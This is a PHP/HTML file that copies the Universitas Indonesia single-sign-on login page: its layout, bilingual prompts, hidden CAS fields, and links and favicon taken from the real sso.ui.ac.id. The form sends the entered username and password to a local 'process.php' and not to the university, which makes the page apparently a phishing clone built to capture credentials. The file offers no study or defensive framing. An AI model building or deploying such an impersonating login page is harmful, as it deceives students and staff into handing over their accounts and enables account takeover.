<?php
/**
 * @author Ryan Aunur Rassyid<112010057>
 */
?>
<!DOCTYPE html>
<html lang="id">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>SSO UI</title>
    <link rel="stylesheet" type="text/css" href="assets/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/sso.css">
    <link rel="icon" href="https://sso.ui.ac.id/cas/themes/ui/logo2_0.gif" type="image/x-icon">
  </head>
  <body>
    <div class="container">
      <div class="main">
        <div class="bg"></div>
        <div class="login-box">
          <form id="fm1" class="login" action="process.php" method="post">
            <div class="top">
              <div class="pull-right">
                <img src="assets/logo.png">
              </div>
              <h1>SSO</h1>
              <div class="sub">Single Sign On</div>
            </div>
            <div class="middle">
              <p>Masukkan username dan password UI Anda/ <br>
                <em>Enter your username and password</em>:
              </p>
              <div class="form-group">
                <input id="username" name="username" class="form-control" onkeyup="this.value = this.value.toLowerCase()" placeholder="Username" autocapitalize="none" type="text" value="" autocomplete="on">
              </div>
              <div class="form-group">
                <input id="password" name="password" class="form-control" placeholder="Password" type="password" value="" autocomplete="off">
              </div>
            </div>
            <input type="hidden" name="lt" value="LT-7318615-qD5v1a6uisuGohRP62pycrg0SY9UdO">
            <input type="hidden" name="execution" value="e2s1">
            <input type="hidden" name="_eventId" value="submit">
            <div style="text-align:right;padding:5px 40px 15px 40px;background:#eee;margin-top:-10px">
              <button type="submit" class="btn btn-lg btn-primary">Login</button>
            </div>
            <div style="padding:15px 0;display:flex;align-items:center;justify-content:space-evenly;border-top:1px solid #ddd;background:#eee">
              <!-- a class="btn btn-success btn-outline" href="https://academic.ui.ac.id/akun-sso">Akun SSO Mahasiswa Baru</a -->
              <a class="btn btn-primary btn-outline" href="https://sso.ui.ac.id/office365">Pendaftaran Office 365</a>
            </div>
            <div class="bottom clearfix" style="padding:5px 40px 10px 40px;text-align:center">
              <div class="help">
                <a href="https://sso.ui.ac.id/account/user/register">Daftar Akun ( <em>Guest Account</em>) </a> &nbsp; | &nbsp; <a href="https://sso.ui.ac.id/account/static/frequently-asked-question-faq">Bantuan ( <em>Help</em>) </a>
              </div>
            </div>
          </form>
        </div>
        <script type="text/javascript">
          function hasError(input) {
            if (input && /has-error/.test(input.parentElement.className)) {
              return input;
            }
          }

          function isEmpty(input) {
            if (input && input.value == "") {
              return input;
            }
          }
          var u = document.getElementById("username");
          var p = document.getElementById("password");
          var candidates = [hasError(u), hasError(p), isEmpty(u), isEmpty(p), u];
          for (var i = 0; i < candidates.length; ++i) {
            if (candidates[i]) {
              candidates[i].focus();
              break;
            }
          }
        </script>
      </div>
    </div>
  </body>
</html>